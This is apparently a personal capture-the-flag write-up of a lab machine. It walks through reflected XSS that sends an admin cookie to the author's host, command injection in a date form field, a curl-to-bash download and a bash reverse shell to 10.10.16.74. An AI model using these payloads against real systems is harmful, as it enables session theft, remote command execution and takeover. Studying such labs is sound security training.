@@ -1,0 +1,110 @@
+nmap scan revealed a upnp service open. it takes http input so i went to the site on that port, also it uses Werkzeug which is a web application library so i probably could visit it
+
+http://10.10.11.8:5000
+
+because the site when i added script tags to the input gave me a hacking attempt alert including ALL of the http request i sent to them, that means whatever input i give them is reflected. It takes the whole of my input and spits it out from their end. sounds like reflected xss to me.
+
+i saw an is_admin cookie in the output from nmap and i also see it when i send my requests to the server through the support form.
+
+5000/tcp open  upnp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.2.2 Python/3.11.2
+|     Date: Fri, 03 May 2024 23:08:18 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 2799
+|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="UTF-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+|     <title>Under Construction</title>
+|     <style>
+|     body {
+|     font-family: 'Arial', sans-serif;
+|     background-color: #f7f7f7;
+|     margin: 0;
+|     padding: 0;
+|     display: flex;
+|     justify-content: center;
+|     align-items: center;
+|     height: 100vh;
+|     .container {
+|     text-align: center;
+|     background-color: #fff;
+|     border-radius: 10px;
+|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
+|   RTSPRequest: 
+|     <!DOCTYPE HTML>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 400</p>
+|     <p>Message: Bad request version ('RTSP/1.0').</p>
+|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
+|     </body>
+|_    </html>
+
+
+since my stuff here is reflected, perhaps i can insert a document.cookie in the http request to get the cookie on their end which is probably one with more permissions than me and hopefully the admin cookie.
+
+
+
+i intercepted and modified the http request in burpsuite. i kept the script tags there in the message box so it would show the hacking attempt error, but changed the user agent http header to an img tag that when it errors out (which it will since it's image path is nonexistent "HAHANOTANIMAGEBOZO") it will send a get request through the fetch function to my ip with the concatenated is_admin cookie.
+
+i get a page where theres a website health report. just a date select and a button. there must be other information in the backend being sent along with this date. this might mean the date is part of a command to log the data?
+
+i could try escaping to another command after the date:
+
+POST /dashboard HTTP/1.1
+Host: 10.10.11.8:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.10.11.8:5000/dashboard
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+Origin: http://10.10.11.8:5000
+Connection: close
+Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+Upgrade-Insecure-Requests: 1
+
+date=2023-09-15;whoami;
+
+the semicolon will run every command the shell can run even if one of the commands fail.
+
+after i forward this output to the site with burp, i get the answer to whoami... dvir
+
+i have shell execution now, but i want a reverse shell. time to do some bash scripty stuff heheuheuhuehueh
+
+
+okay so i dont know what the server is using as the default shell, so i will stay on the safe side and use sh which is the base shell i guess
+
+HAHAHAHA i just cheesed this to get the user. i think i was supposed to get the reverse shell first but yea i did this first haha
+
+date=2023-09-15;whoami;cd+~/;ls;cat+user.txt;
+
++ is for url encoding n stuffsss
+
+
+date=2023-09-15;whoami;echo+$SHELL;
+
+used this to find out the shell it's using. its bash.
+
+OMG THERE WAS SO FUCKIN MUCH TYPOING THIS S ITTTT
+
+2023-09-15%26%26ls%26%26curl+http://10.10.16.74/AAA.sh|bash
+
+then in bash its
+
+bash -c 'bash -i >& /dev/tcp/10.10.16.74/1234 0>&1'
+
+open a python 80 port http server to serve the file and curl it with the above httprequest in burp
